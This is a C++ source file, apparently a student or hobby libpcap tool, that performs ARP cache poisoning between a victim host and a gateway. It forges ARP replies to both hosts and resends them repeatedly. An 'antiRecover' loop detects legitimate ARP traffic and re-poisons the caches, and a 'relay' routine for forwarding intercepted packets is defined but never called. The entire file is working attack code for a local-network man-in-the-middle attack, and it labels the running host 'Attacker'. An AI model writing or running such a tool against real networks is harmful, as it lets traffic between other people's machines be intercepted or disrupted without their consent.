#include <iostream>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ether.h>
#include <string.h>
#include <fstream>
#include <iomanip>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <thread>
#include "mac.h"
#include "ip.h"

using namespace std;

#define PROMISCUOUS 1
#define NONPROMISCUOUS 0

struct ARPPacket{
    struct ether_header eh;
    struct ether_arp arp;
};

void checkArgc(int argc);
void macAddrToHex(char* argvMac, u_int8_t *retnMac);
void findMyMac(char* device, u_int8_t *myMAC);
void printByHexData(u_int8_t* printArr,int length);
void printByMAC(u_int8_t *printArr, int length);
void printLine();
void sendARPReguest(char* device, char *sender_IP, u_int8_t* my_MAC, int print, ARPPacket ARPRequest, pcap_t *pcd);
void sendPacket(ARPPacket *arpReply, int packeLen, pcap_t *pcd);
void getMyIP(char* device, u_int8_t* myIP);
int  findARPReply(char* device, char* rule, u_int8_t *retnMAC);
int antiRecover(char *device, pcap_t *pcd, char *errBuf, ARPPacket *ARPRecover, u_int8_t *senderMAC, u_int8_t *targetMAC, u_int8_t *senderIP, u_int8_t *targetIP);
void relay(char *device, pcap_t *pcd, char *errBuf, u_int8_t *senderIP, u_int8_t *targetIP);

/*send_arp <dev> <sender ip> <target ip>*/

int main(int argc, char *argv[])
{
    checkArgc(argc); //check argc & if wrong sentence print usage

    char* device = argv[1];
    char* senderIp=argv[2];
    char* targetIp=argv[3];


    u_int8_t my_Mac[ETHER_ADDR_LEN]; //hexed MAC Address
    findMyMac(device,my_Mac);

    u_int8_t myIP[16];
    getMyIP(device,myIP);

    char senderRules[50]="dst net ";
    strcat(senderRules,(char*)myIP);//dst net myIP
    strcat(senderRules," and "); //dst net myIP and
    strcat(senderRules,"src net ");//dst net myIP and src net

    char targetRules[50];
    memcpy(targetRules,senderRules,sizeof(senderRules)); //copy
    strcat(senderRules,senderIp);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcd;
    if((pcd = pcap_open_live(device,BUFSIZ,NONPROMISCUOUS,1,errbuf))==NULL)
    {
        perror(errbuf);
        exit(1);
    }

    struct ARPPacket ARPRequest;

    //find sender MAC
    u_int8_t sender_Mac[ETHER_ADDR_LEN];
    thread t1(&findARPReply,device,senderRules,sender_Mac);
    sleep(4);
    thread t2(&sendARPReguest,device,senderIp,my_Mac,1,ARPRequest,pcd);
    t1.join();
    t2.join();

    //find target MAC
    u_int8_t target_Mac[ETHER_ADDR_LEN];
    strcat(targetRules,targetIp);
    thread t3(&findARPReply,device,targetRules,target_Mac);
    sleep(2);
    thread t4(&sendARPReguest,device,targetIp,my_Mac,0,ARPRequest,pcd);
    t3.join();
    t4.join();

    cout<<"Sender MAC : ";
    printByMAC(sender_Mac,ETHER_ADDR_LEN);

    cout<<"Target MAC : ";
    printByMAC(target_Mac,ETHER_ADDR_LEN);


    struct ARPPacket ARPReply;


    memcpy(ARPReply.eh.ether_dhost,sender_Mac,ETHER_ADDR_LEN); //destnation mac is sender mac
    memcpy(ARPReply.eh.ether_shost,my_Mac,ETHER_ADDR_LEN); //source mac is my mac
    ARPReply.eh.ether_type=htons(ETHERTYPE_ARP); //define next protocol



    ARPReply.arp.ea_hdr.ar_hrd=ntohs(1);             //set Hardware Type Ethernet
    ARPReply.arp.ea_hdr.ar_pro=ntohs(ETHERTYPE_IP);  //set protocol type IP
    ARPReply.arp.ea_hdr.ar_hln=6;             //set Hardware Size 6 -> MAC address size
    ARPReply.arp.ea_hdr.ar_pln=4;             //set Protocol length 4 -> 4 IP address size
    ARPReply.arp.ea_hdr.ar_op=ntohs(2);              //set opcode 2(reply)


    memcpy(ARPReply.arp.arp_sha,my_Mac,ETHER_ADDR_LEN);  //set Source Address to Sender MAC
    inet_pton(AF_INET,targetIp,ARPReply.arp.arp_spa);     //set Source Protocol Address to Target IP
    memcpy(ARPReply.arp.arp_tha,sender_Mac,ETHER_ADDR_LEN); //set Target Hardware Address to Sender MAC
    inet_pton(AF_INET,senderIp,ARPReply.arp.arp_tpa);    //set Target Protocol Address to Sender IP



    sendPacket(&ARPReply,sizeof(struct ARPPacket),pcd); //send reply packet


    struct ARPPacket ARPToTargetReply; //to fake gateway

    //init ETHER_HEADER
    memcpy(ARPToTargetReply.eh.ether_dhost,target_Mac,ETHER_ADDR_LEN);
    memcpy(ARPToTargetReply.eh.ether_shost,my_Mac,ETHER_ADDR_LEN);
    ARPToTargetReply.eh.ether_type=htons(ETHERTYPE_ARP);

    //init ARP_HEADER
    memcpy(ARPToTargetReply.arp.arp_sha,my_Mac,ETHER_ADDR_LEN);
    inet_pton(AF_INET,senderIp,ARPToTargetReply.arp.arp_spa);
    memcpy(ARPToTargetReply.arp.arp_tha,target_Mac,ETHER_ADDR_LEN);
    inet_pton(AF_INET,targetIp,ARPToTargetReply.arp.arp_tpa);

    ARPToTargetReply.arp.ea_hdr.ar_hrd=ntohs(1);             //set Hardware Type Ethernet
    ARPToTargetReply.arp.ea_hdr.ar_pro=ntohs(ETHERTYPE_IP);  //set protocol type IP
    ARPToTargetReply.arp.ea_hdr.ar_hln=6;             //set Hardware Size 6 -> MAC address size
    ARPToTargetReply.arp.ea_hdr.ar_pln=4;             //set Protocol length 4 -> 4 IP address size
    ARPToTargetReply.arp.ea_hdr.ar_op=ntohs(2);              //set opcode 2(reply)



    sendPacket(&ARPToTargetReply,sizeof(struct ARPPacket),pcd);//send to gateway request
int count=0;
    while(count++<400)
    {
        sendPacket(&ARPToTargetReply,sizeof(struct ARPPacket),pcd);//send to gateway request
        sleep(1);
    }
    struct ARPPacket ARPRecover;
    int recoverCount=0;

    while(true)
    {
        if(antiRecover(device,pcd,errbuf,&ARPRecover,sender_Mac,target_Mac,ARPReply.arp.arp_tpa,ARPReply.arp.arp_spa))
        {
                    cout<<"antiRecover "<<++recoverCount<<"times worked!!"<<endl;
                    sendPacket(&ARPReply,sizeof(struct ARPPacket),pcd); //send reply packet
                    sendPacket(&ARPToTargetReply,sizeof(struct ARPPacket),pcd); //send reply packet
        }


    }
    return 0;
}

void checkArgc(int argc)
{
    if(argc!=4)
    {
        cout<<" *Usage :  send_arp <dev> <sender ip> <target ip>"<<endl;
        exit(0);
    }
}


void macAddrToHex(char *argvMac,u_int8_t *retnMac)
{
    int cnt=0;
    char tempArr[3];
    u_int8_t value;


    int i=0;

    while(true)
    {
        if(argvMac[i]==':') //if char is ':'
        {
            strncpy(tempArr,argvMac,2);
            tempArr[2]=0;
            value=strtol(tempArr,NULL,16);
            retnMac[cnt++]=(int)value;

            if(cnt==6)
                break;


            argvMac=&argvMac[i+1]; //str cut & save
            i=0;// init index

        }else{
            i++;
        }
    }

}

void findMyMac(char* device,u_int8_t* myMAC)
{
    int fd;
    struct ifreq ifr;

    fd=socket(AF_UNIX,SOCK_DGRAM,0);

    if(fd<0)
    {
        perror("socket error!!");
        exit(1);
    }
    strcpy(ifr.ifr_ifrn.ifrn_name,device); // input device name

    if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0) //SIOCGIFHWADDR -> Get MAC Address
    {
        perror("ioctl :");
        exit(1);
    }
    close(fd);

    memcpy(myMAC,ifr.ifr_ifru.ifru_hwaddr.sa_data,sizeof(ifr.ifr_ifru.ifru_hwaddr.sa_data));

    cout<<"My(Attacker) MAC Address : ";
    printByMAC(myMAC,6);


}

void printByHexData(u_int8_t *printArr, int length)
{

    for(int i=0;i<length;i++)
    {
        if(i%16==0)
            cout<<endl;
        cout<<setfill('0');
        cout<<setw(2)<<hex<<(int)printArr[i]<<" ";


    }

    cout<<dec<<endl;
    printLine();
}

void printByMAC(u_int8_t *printArr,int length)
{
    for(int i=0;i<length;i++)
    {
        cout<<setfill('0');
        cout<<setw(2)<<hex<<(int)printArr[i];
        if(i!=5)
            cout<<":";

    }

    cout<<dec<<endl<<endl;
}

void printLine()
{
    cout<<"-----------------------------------------------"<<endl;
}

void sendARPReguest(char *device, char *senderIP,u_int8_t* my_MAC,int print,ARPPacket ARPRequest,pcap_t *pcd)
{

    u_int8_t broadcast[]={0xff,0xff,0xff,0xff,0xff,0xff};

    //init ETHER_HEADER
    memcpy(ARPRequest.eh.ether_dhost,broadcast,ETHER_ADDR_LEN); //set destination address to broadcast
    memcpy(ARPRequest.eh.ether_shost,my_MAC,ETHER_ADDR_LEN); //set source address to myMAC
    ARPRequest.eh.ether_type=htons(ETH_P_ARP);

    //init ARP_HEADER
    ARPRequest.arp.ea_hdr.ar_hrd=ntohs(1);             //set Hardware Type Ethernet
    ARPRequest.arp.ea_hdr.ar_pro=ntohs(ETHERTYPE_IP);  //set protocol type IP
    ARPRequest.arp.ea_hdr.ar_hln=6;                    //set Hardware Size 6 -> MAC address size
    ARPRequest.arp.ea_hdr.ar_pln=4;                    //set Protocol length 4 -> 4 IP address size
    ARPRequest.arp.ea_hdr.ar_op=ntohs(1);              //set opcode 1(request)

    u_int8_t ARPTargetMAC[ETHER_ADDR_LEN]={0x00,0x00,0x00,0x00,0x00,0x00};

    u_int8_t myIP[16];

    getMyIP(device,myIP);

    memcpy(ARPRequest.arp.arp_sha,my_MAC,sizeof(ARPRequest.arp.arp_sha));  //set Source Address to Sender MAC
    inet_pton(AF_INET,(char*)myIP,ARPRequest.arp.arp_spa);     //set Source Protocol Address to My IP
    memcpy(ARPRequest.arp.arp_tha,ARPTargetMAC,sizeof(ARPRequest.arp.arp_tha)); //set Target Hardware Address to Sender MAC
    inet_pton(AF_INET,senderIP,ARPRequest.arp.arp_tpa);    //set Target Protocol Address to Sender IP


    if(print)
    {
         cout<<"Send ARP Request Packet !!"<<endl;
         cout<<"Send Arp Packet Data "<<endl;
         printByHexData((u_int8_t*)&ARPRequest,sizeof(struct ARPPacket));
    }


     pcap_sendpacket(pcd,(u_int8_t*)&ARPRequest,sizeof(ARPPacket));

}

void sendPacket(ARPPacket *ARPReply,int packetLen,pcap_t* pcd)
{


    u_int8_t *arpReply=(u_int8_t*)ARPReply;
    cout<<endl;
    cout<<"Send ARP Reply Packet !!!"<<endl;

    cout<<"Send Arp Packet Data "<<endl;
    printByHexData(arpReply,packetLen);

    pcap_sendpacket(pcd,arpReply,packetLen);

}

void getMyIP(char* device, u_int8_t* myIP)//return dotted decimal
{
    int fd;
    struct ifreq ifr;

    fd=socket(AF_INET,SOCK_DGRAM,0);


    ifr.ifr_ifru.ifru_addr.sa_family=AF_INET; //input type
    strcpy(ifr.ifr_ifrn.ifrn_name,device); // input device name

    ioctl(fd,SIOCGIFADDR,&ifr); //SIOCGIFADDR -> Get Protocol Address
    close(fd);

    inet_ntop(AF_INET,ifr.ifr_ifru.ifru_addr.sa_data+2,(char*)myIP,sizeof(struct sockaddr));


}

int findARPReply(char *device, char *rule,u_int8_t *retnMAC)
{

    bpf_u_int32 netp;
    bpf_u_int32 maskp;

    char errBuf[PCAP_ERRBUF_SIZE];

    int ret = pcap_lookupnet(device,&netp,&maskp,errBuf);
    if(ret<0)
    {
        perror(errBuf);
    }
    pcap_t *pcd;


    if((pcd=pcap_open_live(device,BUFSIZ,NONPROMISCUOUS,1,errBuf))==NULL)
    {
        perror(errBuf);
        exit(1);
    }

    struct bpf_program fp;

    if(pcap_compile(pcd,&fp,rule,0,netp)==-1)
    {
        cout<<"Set comfile error!!!"<<endl;
        exit(1);
    }

    if(pcap_setfilter(pcd,&fp)==-1)
    {
        cout<<"Setfilter error"<<endl;
        exit(1);
    }


    const u_char *pkt_data;
    struct pcap_pkthdr *pktHeader;
    int valueOfNextEx;

    while(true)
    {

        //need a thread
        valueOfNextEx=pcap_next_ex(pcd,&pktHeader,&pkt_data);

        switch (valueOfNextEx)
        {
            case 1:
                   struct ether_header *ep;
                   ep=(struct ether_header*)pkt_data;
                   memcpy(retnMAC,ep->ether_shost,sizeof(ep->ether_shost));
                   return 0;
            case 0:
                cout<<"need a sec.. to packet capture"<<endl;
                continue;
            case -1:
                perror("pcap_next_ex function has an error!!");
                exit(1);

            case -2:
                cout<<"the packet have reached EOF!!"<<endl;
                exit(0);
            default:
                break;
            }
    }
}

int antiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover,u_int8_t* senderMAC,u_int8_t* targetMAC,u_int8_t* senderIP,u_int8_t* targetIP)
{

    bpf_u_int32 netp;
    bpf_u_int32 maskp;

    int ret = pcap_lookupnet(device,&netp,&maskp,errBuf);
    if(ret<0)
    {
        perror(errBuf);
    }

    const u_char *pkt_data;
    struct pcap_pkthdr *pktHeader;
    int valueOfNextEx;

    while(true)
    {

        //need a thread
        valueOfNextEx=pcap_next_ex(pcd,&pktHeader,&pkt_data);

        switch (valueOfNextEx)
        {
            case 1:

                ARPRecover=(struct ARPPacket *)pkt_data;
                if(ntohs(ARPRecover->eh.ether_type)==ETHERTYPE_ARP) //next packet ARP
                {

                    //senderPC -> gateway
                    Mac sha;
                    Ip  spa;
                    sha=ARPRecover->arp.arp_sha;
                    spa=ARPRecover->arp.arp_spa;

                    if(sha==senderMAC)
                        if(spa==senderIP) //recover about senderIP
                            return 1;


                    //gateway -> senderPC

                    if(sha==targetMAC)
                        if(spa==targetIP) //recover about targetIP
                            return 1;

                }

                 break;
            case 0:
                cout<<"need a sec.. to packet capture"<<endl;
                continue;
            case -1:
                perror("pcap_next_ex function has an error!!");
                exit(1);

            case -2:
                cout<<"the packet have reached EOF!!"<<endl;
                exit(0);
            default:
                break;
            }
    }

}

void relay(char* device, pcap_t* pcd,char* errBuf, u_int8_t* senderIP,u_int8_t* targetIP)
{
    bpf_u_int32 netp,maskp;

    if(pcap_lookupnet(device,&netp,&maskp,errBuf)<0)
    {
        perror(errBuf);
        exit(1);
    }

    struct pcap_pkthdr *pkthdr;
    const u_int8_t* pktdata;
    int valueOfNextEx=0;

    while(true)
    {

        //need a thread
        valueOfNextEx=pcap_next_ex(pcd,&pkthdr,&pktdata);

        switch (valueOfNextEx)
        {
            case 1:
            {
             IpPacket ippacket(pktdata);
                if(ippacket.isIpPacket)//if packet is packet &
                    if(ippacket.saddr==targetIP)//if destination ip address == target IP
                        pcap_sendpacket(pcd,pktdata,pkthdr->len);

                if(ippacket.isIpPacket)//if packet is packet &
                    if(ippacket.daddr==senderIP)//if destination ip address == target IP
                        pcap_sendpacket(pcd,pktdata,pkthdr->len);

                break;
            }
            case 0:
                cout<<"need a sec.. to packet capture"<<endl;
                continue;
            case -1:
                perror("pcap_next_ex function has an error!!");
                exit(1);

            case -2:
                cout<<"the packet have reached EOF!!"<<endl;
                exit(0);
            default:
                break;
            }
    }

}

